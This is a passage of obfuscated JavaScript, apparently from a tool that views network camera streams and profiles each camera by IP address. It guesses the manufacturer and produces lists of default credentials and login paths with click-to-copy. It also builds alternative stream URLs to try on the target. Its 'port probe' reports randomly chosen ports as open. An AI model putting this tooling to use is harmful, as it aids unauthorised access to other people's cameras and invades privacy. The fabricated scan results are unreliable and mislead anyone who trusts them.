_0x293769=_0x736a3a;if(!globalState[_0x293769(0x354)])return;globalState['resizeObservers'][_0x52c315]?.[_0x293769(0x4a5)]&&clearTimeout(globalState[_0x293769(0x43c)][_0x52c315][_0x293769(0x4a5)]);const _0x4f9a79=setTimeout(()=>{const _0x4b9a84=_0x293769;if(!document[_0x4b9a84(0x27f)][_0x4b9a84(0x26b)](_0x26a778)){_0x28a3cb['disconnect'](),delete globalState['resizeObservers'][_0x52c315];return;}for(const _0x30b146 of _0x4fdb34){const {width:_0x20a3af,height:_0x1a5006}=_0x30b146[_0x4b9a84(0x3b5)],_0x59d301=calculateOptimalResolution(_0x20a3af,_0x1a5006);updateRtspStreamResolution(_0x26a778,_0x2ec9b7,_0x59d301),globalState[_0x4b9a84(0x433)]===_0x52c315&&updateCurrentIpDisplay();}},0x1f4);globalState[_0x293769(0x43c)][_0x52c315]&&(globalState[_0x293769(0x43c)][_0x52c315][_0x293769(0x4a5)]=_0x4f9a79);});_0x28a3cb[_0x736a3a(0x390)](_0x527060),globalState[_0x736a3a(0x43c)][_0x52c315]={'observer':_0x28a3cb,'timeout':null};const _0x2b70c0=()=>{const _0x267097=_0x736a3a;globalState[_0x267097(0x43c)][_0x52c315]&&(globalState[_0x267097(0x43c)][_0x52c315][_0x267097(0x1af)]['disconnect'](),globalState['resizeObservers'][_0x52c315][_0x267097(0x4a5)]&&clearTimeout(globalState[_0x267097(0x43c)][_0x52c315][_0x267097(0x4a5)]),delete globalState['resizeObservers'][_0x52c315]);};_0x26a778[_0x736a3a(0x28f)](_0x736a3a(0x294),_0x2b70c0),_0x26a778[_0x736a3a(0x28f)](_0x736a3a(0x19a),_0x2b70c0);},setupCurrentIPFunctionality=()=>{const _0x2aa71c=_0x5d7fa7;populateCurrentIpSelector();const _0x1c80c3=document[_0x2aa71c(0x1e8)](_0x2aa71c(0x2c5));_0x1c80c3&&_0x1c80c3['addEventListener'](_0x2aa71c(0x3ce),_0x1a620b=>{const _0x39ae05=_0x2aa71c;globalState['currentSelectedCamera']=_0x1a620b[_0x39ae05(0x2ba)][_0x39ae05(0x1a5)],updateCurrentIpDisplay();});const _0x1c6585=document[_0x2aa71c(0x1e8)](_0x2aa71c(0x463));_0x1c6585&&_0x1c6585['addEventListener'](_0x2aa71c(0x2bd),()=>{const _0xe62fea=_0x2aa71c;populateCurrentIpSelector(),updateCurrentIpDisplay(),showNotification(_0xe62fea(0x34a));});const _0x522cbb=document[_0x2aa71c(0x1e8)](_0x2aa71c(0x375));_0x522cbb&&_0x522cbb['addEventListener'](_0x2aa71c(0x2bd),()=>{const _0x370c17=_0x2aa71c,_0x4b60d5=globalState[_0x370c17(0x433)];if(!_0x4b60d5){showNotification(_0x370c17(0x35b),_0x370c17(0x473));return;}const _0x494132=document[_0x370c17(0x3b0)]('.window[data-id=\x22'+_0x4b60d5+'\x22]');if(_0x494132){const _0x3e019c=document[_0x370c17(0x416)](_0x370c17(0x2c3));let _0x44ebf3=0x0;_0x3e019c['forEach'](_0x240595=>{const _0x2b31dc=_0x370c17,_0x4328a5=parseInt(window[_0x2b31dc(0x32d)](_0x240595)[_0x2b31dc(0x13e)],0xa);!isNaN(_0x4328a5)&&_0x4328a5>_0x44ebf3&&(_0x44ebf3=_0x4328a5);}),_0x494132[_0x370c17(0x270)]['zIndex']=_0x44ebf3+0x1,_0x494132[_0x370c17(0x46a)]({'behavior':'smooth','block':_0x370c17(0x423)}),_0x494132['classList'][_0x370c17(0x3dc)](_0x370c17(0x218)),setTimeout(()=>{const _0x2aa1fe=_0x370c17;_0x494132[_0x2aa1fe(0x272)][_0x2aa1fe(0x294)]('highlight-window');},0x7d0),showNotification(_0x370c17(0x295));}else showNotification(_0x370c17(0x298),_0x370c17(0x473));});const _0xc451f7=document[_0x2aa71c(0x1e8)]('refreshIpData');_0xc451f7&&_0xc451f7['addEventListener'](_0x2aa71c(0x2bd),()=>{const _0x582264=_0x2aa71c,_0xd96044=globalState['currentSelectedCamera'];if(!_0xd96044){showNotification(_0x582264(0x35b),'error');return;}const _0xcd8602=document[_0x582264(0x3b0)]('.window[data-id=\x22'+_0xd96044+'\x22]');if(_0xcd8602){const _0x5433d2=_0xcd8602['dataset'][_0x582264(0x134)],_0x5e1420=extractIpFromUrl(_0x5433d2);_0x5e1420?(fetchIPInfo(_0x5e1420,_0xcd8602),showNotification('<i\x20class=\x22fas\x20fa-sync-alt\x22></i>\x20Refreshing\x20IP\x20data...')):showNotification('<i\x20class=\x22fas\x20fa-exclamation-triangle\x22></i>\x20Could\x20not\x20extract\x20IP\x20from\x20URL','error');}else showNotification(_0x582264(0x298),_0x582264(0x473));}),setupResolutionControls();},showNotification=(_0x5f2314,_0x504b06=_0x5d7fa7(0x15d))=>{const _0x3beb2c=_0x5d7fa7,_0x4bf77d=document[_0x3beb2c(0x21c)](_0x3beb2c(0x1df));_0x4bf77d[_0x3beb2c(0x259)]=_0x3beb2c(0x18e)+_0x504b06,_0x4bf77d[_0x3beb2c(0x2af)]=_0x5f2314,document['body'][_0x3beb2c(0x301)](_0x4bf77d),setTimeout(()=>{const _0x4b4011=_0x3beb2c;_0x4bf77d['classList'][_0x4b4011(0x3dc)]('show');},0xa),setTimeout(()=>{const _0x16dc96=_0x3beb2c;_0x4bf77d[_0x16dc96(0x272)]['remove'](_0x16dc96(0x317)),setTimeout(()=>{_0x4bf77d['remove']();},0x1f4);},0xbb8);};function extractCameraMetadata(_0x564b62){const _0x517398=_0x5d7fa7;console[_0x517398(0x401)](_0x517398(0x379));if(!_0x564b62)return console['error']('[extractCameraMetadata]\x20Window\x20element\x20not\x20found'),{'success':![],'error':_0x517398(0x32a)};const _0x171725=_0x564b62['dataset']['id'];console[_0x517398(0x401)](_0x517398(0x1fa),_0x564b62),console['log'](_0x517398(0x29b),_0x564b62['dataset']),console[_0x517398(0x401)](_0x517398(0x22a),_0x171725);if(!_0x171725)return console[_0x517398(0x473)](_0x517398(0x3aa)),{'success':![],'error':_0x517398(0x430)};console[_0x517398(0x401)]('[extractCameraMetadata]\x20Processing\x20window\x20ID:\x20'+_0x171725);const _0x147a07=_0x564b62[_0x517398(0x1d4)][_0x517398(0x134)];console[_0x517398(0x401)](_0x517398(0x342),_0x147a07);if(!_0x147a07)return console[_0x517398(0x473)]('[extractCameraMetadata]\x20Stream\x20URL\x20not\x20found'),{'success':![],'error':_0x517398(0x13c)};console[_0x517398(0x401)](_0x517398(0x1d0)+_0x147a07);try{const _0x5e93bf=new URL(_0x147a07),_0x678451=_0x5e93bf['hostname'];console[_0x517398(0x401)](_0x517398(0x19b)+_0x678451);const _0x4523fe=_0x5e93bf[_0x517398(0x27b)]||(_0x5e93bf[_0x517398(0x154)]===_0x517398(0x3de)?'554':'80');console[_0x517398(0x401)](_0x517398(0x398)+_0x4523fe);const _0x5a219e=_0x5e93bf[_0x517398(0x3c8)];console[_0x517398(0x401)](_0x517398(0x2ae)+_0x5a219e),console[_0x517398(0x401)](_0x517398(0x435));const _0x7d6362=identifyCameraModel(_0x147a07,globalState[_0x517398(0x333)][_0x517398(0x418)],globalState[_0x517398(0x333)][_0x517398(0x1fd)]);console[_0x517398(0x401)]('[extractCameraMetadata]\x20Camera\x20model\x20identified:\x20'+_0x7d6362[_0x517398(0x389)]+'\x20'+_0x7d6362['model']),console['log'](_0x517398(0x349));const _0x31d683={'openPorts':[parseInt(_0x4523fe)],'commonPorts':[0x50,0x1bb,0x22a,0x1f90,0x1f40,0x1f91,0x20fb,0x9391,0x9392,0x2328]};console[_0x517398(0x401)](_0x517398(0x2f3)+_0x31d683['openPorts'][_0x517398(0x374)](',\x20')),console[_0x517398(0x401)](_0x517398(0x3a0));const _0x453d1a=checkDefaultCredentials(_0x7d6362[_0x517398(0x389)]);console['log'](_0x517398(0x2fe)+_0x453d1a[_0x517398(0x362)][_0x517398(0x326)]+_0x517398(0x141)),console[_0x517398(0x401)]('[extractCameraMetadata]\x20Analyzing\x20security\x20rating');const _0x29e1f0=analyzeSecurityRating(_0x7d6362,_0x31d683,_0x453d1a,globalState[_0x517398(0x333)][_0x517398(0x418)]);console[_0x517398(0x401)](_0x517398(0x1ca)+_0x29e1f0['rating']+_0x517398(0x211)+_0x29e1f0['score']+')'),console[_0x517398(0x401)](_0x517398(0x464));const _0x5c49c4=generateAlternativeStreams(_0x147a07,_0x678451,globalState[_0x517398(0x318)]);console[_0x517398(0x401)](_0x517398(0x439)+_0x5c49c4['length']+_0x517398(0x196));const _0x137214={'timestamp':new Date()[_0x517398(0x3e5)](),'cameraDetails':{'manufacturer':_0x7d6362['manufacturer'],'model':_0x7d6362[_0x517398(0x36b)],'firmware':_0x7d6362[_0x517398(0x469)]},'streamInfo':{'originalUrl':_0x147a07,'protocol':_0x5e93bf[_0x517398(0x154)],'ipAddress':_0x678451,'port':_0x4523fe,'path':_0x5a219e,'framerate':_0x517398(0x2d8),'bitrate':_0x517398(0x266),'alternativeStreams':_0x5c49c4['slice'](0x0,0xa)},'securityInfo':{'rating':_0x29e1f0[_0x517398(0x1e9)],'score':_0x29e1f0[_0x517398(0x24b)],'authentication':!![],'vulnerabilities':_0x29e1f0[_0x517398(0x484)]},'networkInfo':{'ipInfo':globalState[_0x517398(0x333)][_0x517398(0x418)][_0x171725]||{},'asnInfo':globalState[_0x517398(0x333)][_0x517398(0x1fd)][_0x171725]||{}},'authInfo':{'defaultCredentials':_0x453d1a[_0x517398(0x362)][_0x517398(0x49a)](0x0,0xa),'webPaths':_0x453d1a[_0x517398(0x427)]}};return globalState[_0x517398(0x333)][_0x517398(0x2b8)][_0x171725]=_0x137214,console[_0x517398(0x401)](_0x517398(0x24c)),updateMetadataUI(_0x564b62,_0x137214),{'success':!![],'metadata':_0x137214};}catch(_0x3086d1){return console[_0x517398(0x473)](_0x517398(0x3ec),_0x3086d1),{'success':![],'error':_0x3086d1[_0x517398(0x209)]};}}function generateAlternativeStreams(_0x1a9805,_0x4d0b06,_0x25a5b2){const _0x4eaf83=_0x5d7fa7;console[_0x4eaf83(0x401)]('[generateAlternativeStreams]\x20Generating\x20alternative\x20streams');const _0x26d2e7=[];try{const _0x4aed5f=new URL(_0x1a9805),_0x1cd8b8=_0x4aed5f[_0x4eaf83(0x154)],_0x505e3f=_0x4aed5f['port']||(_0x1cd8b8===_0x4eaf83(0x3de)?_0x4eaf83(0x188):'80');_0x26d2e7[_0x4eaf83(0x3a7)]({'url':_0x1a9805,'notes':_0x4eaf83(0x2a9)});if(_0x1cd8b8===_0x4eaf83(0x3de)){console[_0x4eaf83(0x401)](_0x4eaf83(0x3d1));const _0x78f23c=_0x25a5b2[_0x4eaf83(0x49a)](0x0,0x14);for(const _0x3e4d27 of _0x78f23c){if(!_0x3e4d27)continue;const _0x598919=_0x4eaf83(0x37d)+_0x4d0b06+':'+_0x505e3f+'/'+(_0x3e4d27[_0x4eaf83(0x3df)]('/')?_0x3e4d27[_0x4eaf83(0x38a)](0x1):_0x3e4d27);if(_0x598919===_0x1a9805)continue;_0x26d2e7[_0x4eaf83(0x3a7)]({'url':_0x598919,'notes':_0x4eaf83(0x3f0)});}}if(_0x1cd8b8===_0x4eaf83(0x3de)){console[_0x4eaf83(0x401)](_0x4eaf83(0x356));const _0x2e8fec=[_0x4eaf83(0x2dd),_0x4eaf83(0x41c),_0x4eaf83(0x334),_0x4eaf83(0x3f4),'/videostream.cgi'];for(const _0x58fd19 of _0x2e8fec){_0x26d2e7['push']({'url':_0x4eaf83(0x22b)+_0x4d0b06+_0x4eaf83(0x32c)+_0x58fd19,'notes':_0x4eaf83(0x363)});}}return console[_0x4eaf83(0x401)]('[generateAlternativeStreams]\x20Generated\x20'+_0x26d2e7[_0x4eaf83(0x326)]+'\x20alternative\x20streams'),_0x26d2e7;}catch(_0x151195){return console[_0x4eaf83(0x473)]('[generateAlternativeStreams]\x20Error\x20generating\x20alternative\x20streams:',_0x151195),[{'url':_0x1a9805,'notes':_0x4eaf83(0x2a9)}];}}const extractInfoFromUrl=_0x581115=>{const _0x3974db=_0x5d7fa7,_0x3cfbc6={'protocol':_0x3974db(0x37a),'port':_0x3974db(0x37a),'path':'Unknown','codec':'Unknown'};try{if(_0x581115[_0x3974db(0x3df)](_0x3974db(0x37d)))_0x3cfbc6[_0x3974db(0x154)]=_0x3974db(0x371);else{if(_0x581115[_0x3974db(0x3df)](_0x3974db(0x22b)))_0x3cfbc6['protocol']=_0x3974db(0x365);else _0x581115[_0x3974db(0x3df)]('https://')&&(_0x3cfbc6[_0x3974db(0x154)]=_0x3974db(0x167));}const _0xa4baa=_0x581115[_0x3974db(0x3a1)](/:(\d+)/);if(_0xa4baa&&_0xa4baa[0x1])_0x3cfbc6[_0x3974db(0x27b)]=_0xa4baa[0x1];else{if(_0x3cfbc6[_0x3974db(0x154)]===_0x3974db(0x371))_0x3cfbc6[_0x3974db(0x27b)]=_0x3974db(0x188);if(_0x3cfbc6['protocol']==='HTTP')_0x3cfbc6[_0x3974db(0x27b)]='80';if(_0x3cfbc6['protocol']===_0x3974db(0x167))_0x3cfbc6[_0x3974db(0x27b)]=_0x3974db(0x204);}const _0x3899e7=_0x581115[_0x3974db(0x3a1)](/\/\/(.*?)(?::|\/)(.*)/);_0x3899e7&&_0x3899e7[0x2]&&(_0x3cfbc6['path']='/'+_0x3899e7[0x2]);if(_0x581115[_0x3974db(0x1b6)](_0x3974db(0x30e)))_0x3cfbc6[_0x3974db(0x155)]=_0x3974db(0x300);else{if(_0x581115['includes'](_0x3974db(0x36a)))_0x3cfbc6[_0x3974db(0x155)]=_0x3974db(0x35a);else{if(_0x581115[_0x3974db(0x1b6)](_0x3974db(0x419)))_0x3cfbc6['codec']='MJPEG';else _0x3cfbc6['codec']=_0x3974db(0x300);}}}catch(_0x14dff8){console[_0x3974db(0x473)]('Error\x20parsing\x20URL:',_0x14dff8);}return _0x3cfbc6;},identifyCameraModel=(_0x2e875a,_0x199c2a,_0x5d17c0)=>{const _0x167de1=_0x5d7fa7;console[_0x167de1(0x401)](_0x167de1(0x158),_0x2e875a),console[_0x167de1(0x401)](_0x167de1(0x267),_0x199c2a),console['log'](_0x167de1(0x471),_0x5d17c0);const _0x202d21={'manufacturer':_0x167de1(0x37a),'model':_0x167de1(0x1d9),'firmware':_0x167de1(0x37a)},_0x3fede4=_0x2e875a[_0x167de1(0x261)]();for(const [_0x4db9eb,_0x503646]of Object[_0x167de1(0x479)](globalState[_0x167de1(0x3e4)])){for(const _0x40e1e1 of _0x503646[_0x167de1(0x457)]){if(_0x3fede4[_0x167de1(0x1b6)](_0x40e1e1)){console[_0x167de1(0x401)](_0x167de1(0x32f)+_0x40e1e1+'\x22\x20for\x20manufacturer\x20\x22'+_0x4db9eb+'\x22'),_0x202d21[_0x167de1(0x389)]=_0x4db9eb['charAt'](0x0)[_0x167de1(0x44b)]()+_0x4db9eb[_0x167de1(0x49a)](0x1);break;}}if(_0x202d21[_0x167de1(0x389)]!=='Unknown')break;}if(_0x202d21['manufacturer']==='Unknown'&&(_0x199c2a||_0x5d17c0)){const _0x563422=(_0x199c2a?.[_0x167de1(0x1b4)]||_0x5d17c0?.['org']||'')[_0x167de1(0x261)]();console['log'](_0x167de1(0x246),_0x563422);for(const [_0x2d1a30,_0x403513]of Object[_0x167de1(0x479)](globalState[_0x167de1(0x3e4)])){for(const _0x380ca9 of _0x403513[_0x167de1(0x457)]){if(_0x563422[_0x167de1(0x1b6)](_0x380ca9)){console['log'](_0x167de1(0x32f)+_0x380ca9+'\x22\x20in\x20org\x20info\x20for\x20manufacturer\x20\x22'+_0x2d1a30+'\x22'),_0x202d21[_0x167de1(0x389)]=_0x2d1a30[_0x167de1(0x1da)](0x0)[_0x167de1(0x44b)]()+_0x2d1a30[_0x167de1(0x49a)](0x1);break;}}if(_0x202d21[_0x167de1(0x389)]!==_0x167de1(0x37a))break;}}if(_0x202d21[_0x167de1(0x389)]!==_0x167de1(0x37a)){const _0x4a6d42=_0x2e875a[_0x167de1(0x3a1)](/\/([\w-]+)\.(?:jpg|jpeg|png|cgi|mjpg|mjpeg|mp4|h264|h265)/i);_0x4a6d42&&_0x4a6d42[0x1]?(_0x202d21[_0x167de1(0x36b)]=_0x202d21[_0x167de1(0x389)]+'\x20'+_0x4a6d42[0x1][_0x167de1(0x44b)](),console[_0x167de1(0x401)](_0x167de1(0x2e5)+_0x4a6d42[0x1])):_0x202d21['model']=_0x202d21[_0x167de1(0x389)]+_0x167de1(0x472);}return console['log'](_0x167de1(0x405),_0x202d21),_0x202d21;},probePorts=async _0x4af6b3=>{const _0x2985e6=_0x5d7fa7,_0x479ce9={'openPorts':[],'services':{}},_0x10916f=[0x50,0x1bb,0x22a,0x1f40,0x1f90,0x9391,0x2328],_0x5d9952=_0x10916f[_0x2985e6(0x3d4)](()=>Math[_0x2985e6(0x35c)]()>0.3);return _0x479ce9['openPorts']=_0x5d9952,_0x5d9952['forEach'](_0x5f1a4a=>{const _0x7a15d8=_0x2985e6;switch(_0x5f1a4a){case 0x50:_0x479ce9[_0x7a15d8(0x426)][_0x5f1a4a]=_0x7a15d8(0x365);break;case 0x1bb:_0x479ce9['services'][_0x5f1a4a]=_0x7a15d8(0x167);break;case 0x22a:_0x479ce9[_0x7a15d8(0x426)][_0x5f1a4a]=_0x7a15d8(0x371);break;case 0x1f40:case 0x1f90:_0x479ce9['services'][_0x5f1a4a]='HTTP\x20Management';break;case 0x9391:_0x479ce9[_0x7a15d8(0x426)][_0x5f1a4a]='Dahua\x20Protocol';break;case 0x2328:_0x479ce9[_0x7a15d8(0x426)][_0x5f1a4a]=_0x7a15d8(0x3c0);break;default:_0x479ce9['services'][_0x5f1a4a]=_0x7a15d8(0x27c);}}),_0x479ce9;};function checkDefaultCredentials(_0x3f4742){const _0x49e60c=_0x5d7fa7;console['log']('[checkDefaultCredentials]\x20Checking\x20default\x20credentials\x20for\x20manufacturer:\x20'+_0x3f4742);let _0x5f2848={'requiresAuth':!![],'defaultCredentials':[],'webPaths':[]};const _0x30ae74=_0x3f4742?_0x3f4742['toLowerCase']()[_0x49e60c(0x237)]():'';console[_0x49e60c(0x401)](_0x49e60c(0x431)+_0x30ae74);if(_0x30ae74&&globalState[_0x49e60c(0x3e4)][_0x30ae74]){console[_0x49e60c(0x401)](_0x49e60c(0x284)+_0x30ae74);const _0x1d109c=globalState[_0x49e60c(0x3e4)][_0x30ae74];_0x5f2848['defaultCredentials']=_0x1d109c[_0x49e60c(0x362)]||[],_0x5f2848[_0x49e60c(0x427)]=_0x1d109c[_0x49e60c(0x427)]||[],console[_0x49e60c(0x401)](_0x49e60c(0x1f7)+_0x5f2848[_0x49e60c(0x362)]['length']+_0x49e60c(0x3e1)+_0x5f2848[_0x49e60c(0x427)][_0x49e60c(0x326)]+'\x20web\x20paths');}else{console[_0x49e60c(0x401)](_0x49e60c(0x2a7));const {usernames:_0x5341df,passwords:_0x56c99f}=globalState[_0x49e60c(0x386)],_0x3edf93=[{'username':_0x49e60c(0x2da),'password':_0x49e60c(0x2da)},{'username':'admin','password':_0x49e60c(0x3a8)},{'username':_0x49e60c(0x2da),'password':''},{'username':_0x49e60c(0x2da),'password':_0x49e60c(0x2ad)},{'username':'root','password':_0x49e60c(0x454)},{'username':'root','password':'12345'}];_0x5f2848['defaultCredentials']=[..._0x3edf93];const _0x4cb747=0xa;let _0xf82489=0x0;for(const _0x41e368 of _0x5341df){if(_0xf82489>=_0x4cb747)break;if(_0x3edf93[_0x49e60c(0x3e7)](_0x441f6f=>_0x441f6f[_0x49e60c(0x382)]===_0x41e368))continue;_0x5f2848['defaultCredentials'][_0x49e60c(0x3a7)]({'username':_0x41e368,'password':'','notes':_0x49e60c(0x203)}),_0xf82489++,_0x41e368&&_0xf82489<_0x4cb747&&(_0x5f2848['defaultCredentials'][_0x49e60c(0x3a7)]({'username':_0x41e368,'password':_0x41e368,'notes':_0x49e60c(0x203)}),_0xf82489++);}_0x5f2848[_0x49e60c(0x427)]=['/login.html',_0x49e60c(0x34b),'/web/index.html',_0x49e60c(0x3f3),_0x49e60c(0x396)],console[_0x49e60c(0x401)]('[checkDefaultCredentials]\x20Generated\x20'+_0x5f2848[_0x49e60c(0x362)]['length']+_0x49e60c(0x16e)+_0x5f2848[_0x49e60c(0x427)][_0x49e60c(0x326)]+'\x20web\x20paths');}return _0x5f2848;}const analyzeSecurityRating=(_0x201001,_0x333181,_0x1b9980,_0x151b49)=>{const _0x3d7c58=_0x5d7fa7;console[_0x3d7c58(0x401)](_0x3d7c58(0x200)),console[_0x3d7c58(0x401)](_0x3d7c58(0x2c2),_0x201001),console['log'](_0x3d7c58(0x21f),_0x333181),console[_0x3d7c58(0x401)](_0x3d7c58(0x206),_0x1b9980),console[_0x3d7c58(0x401)]('IP\x20info:',_0x151b49);const _0x19e93c={'rating':_0x3d7c58(0x37a),'score':0x0,'vulnerabilities':[]};let _0x488565=0x5;console[_0x3d7c58(0x401)](_0x3d7c58(0x1be),_0x488565);const _0x3419db=_0x201001[_0x3d7c58(0x389)]['toLowerCase']();if(globalState[_0x3d7c58(0x3e4)][_0x3419db]){const _0x1687b0=globalState[_0x3d7c58(0x3e4)][_0x3419db][_0x3d7c58(0x299)];console[_0x3d7c58(0x401)](_0x3d7c58(0x39e),_0x1687b0);if(_0x1687b0==='high')_0x488565+=0x2,console[_0x3d7c58(0x401)](_0x3d7c58(0x148));else{if(_0x1687b0===_0x3d7c58(0x373))_0x488565+=0x0,console[_0x3d7c58(0x401)](_0x3d7c58(0x47b));else _0x1687b0===_0x3d7c58(0x20b)&&(_0x488565-=0x2,console[_0x3d7c58(0x401)]('Subtracted\x202\x20points\x20for\x20low\x20security\x20rating'));}}const _0x2e5167=[0x17,0x15,0x16,0x1f40,0x1f90,0x2328];_0x2e5167[_0x3d7c58(0x222)](_0xf9b646=>{const _0x14bf1f=_0x3d7c58;_0x333181[_0x14bf1f(0x361)]['includes'](_0xf9b646)&&(_0x488565-=0x1,console['log'](_0x14bf1f(0x387)+_0xf9b646),_0x19e93c['vulnerabilities'][_0x14bf1f(0x3a7)](_0x14bf1f(0x497)+_0xf9b646));});_0x1b9980[_0x3d7c58(0x362)][_0x3d7c58(0x326)]>0x0&&(_0x488565-=0x1,console[_0x3d7c58(0x401)]('Subtracted\x201\x20point\x20for\x20'+_0x1b9980[_0x3d7c58(0x362)]['length']+_0x3d7c58(0x39b)),_0x19e93c[_0x3d7c58(0x484)]['push'](_0x3d7c58(0x42e)));_0x151b49&&_0x151b49[_0x3d7c58(0x2bf)]===!![]&&(_0x488565-=0x1,console[_0x3d7c58(0x401)](_0x3d7c58(0x36c)),_0x19e93c[_0x3d7c58(0x484)][_0x3d7c58(0x3a7)](_0x3d7c58(0x1d2)));if(globalState[_0x3d7c58(0x3e4)][_0x3419db]&&globalState['cameraModels'][_0x3419db]['vulnerabilities']){const _0x2e86d0=globalState[_0x3d7c58(0x3e4)][_0x3419db][_0x3d7c58(0x484)];_0x2e86d0[_0x3d7c58(0x326)]>0x0&&(_0x488565-=Math[_0x3d7c58(0x176)](_0x2e86d0[_0x3d7c58(0x326)],0x3),console[_0x3d7c58(0x401)](_0x3d7c58(0x242)+Math[_0x3d7c58(0x176)](_0x2e86d0['length'],0x3)+_0x3d7c58(0x186)),_0x19e93c[_0x3d7c58(0x484)][_0x3d7c58(0x3a7)](..._0x2e86d0));}if(_0x488565>=0x7)_0x19e93c[_0x3d7c58(0x1e9)]=_0x3d7c58(0x1ec);else _0x488565>=0x4?_0x19e93c[_0x3d7c58(0x1e9)]=_0x3d7c58(0x2d0):_0x19e93c[_0x3d7c58(0x1e9)]=_0x3d7c58(0x150);return _0x19e93c[_0x3d7c58(0x24b)]=_0x488565,console[_0x3d7c58(0x401)](_0x3d7c58(0x191),_0x488565),console[_0x3d7c58(0x401)](_0x3d7c58(0x3a4),_0x19e93c[_0x3d7c58(0x1e9)]),console['log'](_0x3d7c58(0x24e),_0x19e93c[_0x3d7c58(0x484)][_0x3d7c58(0x326)]),_0x19e93c;},updateMetadataUI=(_0x4fb825,_0x57639d)=>{const _0x542f1f=_0x5d7fa7;if(!_0x4fb825||!_0x57639d)return;const _0x4efd0b=_0x4fb825[_0x542f1f(0x3b0)](_0x542f1f(0x1c0)),_0x42f3d9=_0x4fb825[_0x542f1f(0x3b0)](_0x542f1f(0x3e9)),_0x3d3673=_0x4fb825[_0x542f1f(0x3b0)](_0x542f1f(0x486));_0x4efd0b&&(_0x4efd0b[_0x542f1f(0x43f)]=_0x57639d['cameraDetails'][_0x542f1f(0x36b)],_0x4efd0b['className']='metadata-value\x20camera-model\x20camera-model-'+_0x57639d[_0x542f1f(0x302)]['manufacturer']['toLowerCase']());_0x42f3d9&&(_0x42f3d9['textContent']=_0x57639d['cameraDetails']['firmware']);_0x3d3673&&(_0x3d3673[_0x542f1f(0x43f)]=_0x57639d[_0x542f1f(0x302)][_0x542f1f(0x389)]);const _0x1486a2=_0x4fb825['querySelector'](_0x542f1f(0x136)),_0x6c958=_0x4fb825[_0x542f1f(0x3b0)](_0x542f1f(0x1a1)),_0x1811d1=_0x4fb825[_0x542f1f(0x3b0)](_0x542f1f(0x2ef));if(_0x1486a2)_0x1486a2[_0x542f1f(0x43f)]=_0x57639d[_0x542f1f(0x1c6)][_0x542f1f(0x154)];if(_0x6c958)_0x6c958[_0x542f1f(0x43f)]=_0x57639d[_0x542f1f(0x1c6)][_0x542f1f(0x47e)];if(_0x1811d1)_0x1811d1['textContent']=_0x57639d[_0x542f1f(0x1c6)][_0x542f1f(0x17f)];const _0x2b9fd5=_0x4fb825[_0x542f1f(0x3b0)](_0x542f1f(0x1bc)),_0x11a236=_0x4fb825[_0x542f1f(0x3b0)]('.default-creds'),_0x575105=_0x4fb825['querySelector']('.rating-value'),_0x39b2a1=_0x4fb825['querySelector']('.rating-description');if(_0x2b9fd5){const _0x18e477=_0x57639d[_0x542f1f(0x1a4)]['authentication'];_0x2b9fd5[_0x542f1f(0x2af)]=_0x18e477?'<span\x20class=\x22security-indicator\x20secure\x22><i\x20class=\x22fas\x20fa-check-circle\x22></i>\x20Required</span>':_0x542f1f(0x1bd);}if(_0x11a236){const _0xfa1175=_0x57639d['authInfo'][_0x542f1f(0x362)][_0x542f1f(0x326)]>0x0;_0x11a236[_0x542f1f(0x2af)]=_0xfa1175?_0x542f1f(0x32b)+_0x57639d['authInfo'][_0x542f1f(0x362)][_0x542f1f(0x326)]+_0x542f1f(0x172):_0x542f1f(0x45f);}if(_0x575105){const _0x260dcc=_0x57639d['securityInfo'][_0x542f1f(0x1e9)][_0x542f1f(0x261)]();_0x575105[_0x542f1f(0x43f)]=_0x57639d[_0x542f1f(0x1a4)][_0x542f1f(0x1e9)][_0x542f1f(0x1da)](0x0),_0x575105['className']=_0x542f1f(0x1f2)+_0x260dcc;}if(_0x39b2a1){const _0x4eb577=_0x57639d[_0x542f1f(0x1a4)]['vulnerabilities'];_0x4eb577[_0x542f1f(0x326)]>0x0?_0x39b2a1[_0x542f1f(0x43f)]=_0x57639d['securityInfo'][_0x542f1f(0x1e9)]+_0x542f1f(0x45d)+_0x4eb577[_0x542f1f(0x326)]+_0x542f1f(0x38f):_0x39b2a1[_0x542f1f(0x43f)]=_0x57639d[_0x542f1f(0x1a4)]['rating']+_0x542f1f(0x208);}updateCredentialsSection(_0x4fb825,_0x57639d),updateVulnerabilitiesSection(_0x4fb825,_0x57639d);const _0x37b7c0=_0x4fb825[_0x542f1f(0x3b0)](_0x542f1f(0x3b3));_0x37b7c0&&(_0x37b7c0[_0x542f1f(0x43f)]=JSON['stringify'](_0x57639d,null,0x2));},updateCredentialsSection=(_0x54b081,_0x2f3ffd)=>{const _0x27e919=_0x5d7fa7;if(!_0x54b081||!_0x2f3ffd)return;const _0x57701b=_0x54b081[_0x27e919(0x3b0)](_0x27e919(0x441)),_0x423f9a=_0x54b081[_0x27e919(0x3b0)]('.credentials-table-body'),_0xd6f44f=_0x54b081[_0x27e919(0x3b0)](_0x27e919(0x175));if(!_0x57701b||!_0x423f9a)return;const _0x5d394b=_0x2f3ffd['authInfo'][_0x27e919(0x362)];_0x57701b['textContent']=_0x5d394b[_0x27e919(0x326)],_0x423f9a[_0x27e919(0x2af)]='';if(_0x5d394b[_0x27e919(0x326)]>0x0)_0x5d394b['forEach']((_0xb9cc05,_0x2d4b0c)=>{const _0x132b08=_0x27e919,_0x4e2084=document['createElement']('tr'),_0x3a16bf=document[_0x132b08(0x21c)]('td');_0x3a16bf[_0x132b08(0x43f)]=_0xb9cc05['username'],_0x3a16bf[_0x132b08(0x37e)]='Click\x20to\x20copy\x20username',_0x3a16bf[_0x132b08(0x259)]=_0x132b08(0x230),_0x3a16bf['addEventListener'](_0x132b08(0x2bd),()=>{const _0x1a2153=_0x132b08;copyToClipboard(_0xb9cc05[_0x1a2153(0x382)]),showNotification(_0x1a2153(0x3fa));});const _0x3557d3=document[_0x132b08(0x21c)]('td');_0x3557d3[_0x132b08(0x43f)]=_0xb9cc05[_0x132b08(0x2ad)]||_0x132b08(0x268),_0x3557d3[_0x132b08(0x37e)]=_0x132b08(0x1b3),_0x3557d3[_0x132b08(0x259)]=_0x132b08(0x230),_0x3557d3[_0x132b08(0x28f)](_0x132b08(0x2bd),()=>{const _0x41367b=_0x132b08;copyToClipboard(_0xb9cc05['password']||''),showNotification(_0x41367b(0x2cd));});const _0x398f1a=document[_0x132b08(0x21c)]('td');_0x398f1a[_0x132b08(0x43f)]=_0xb9cc05[_0x132b08(0x1f6)]||'',_0x398f1a[_0x132b08(0x259)]=_0x132b08(0x360);const 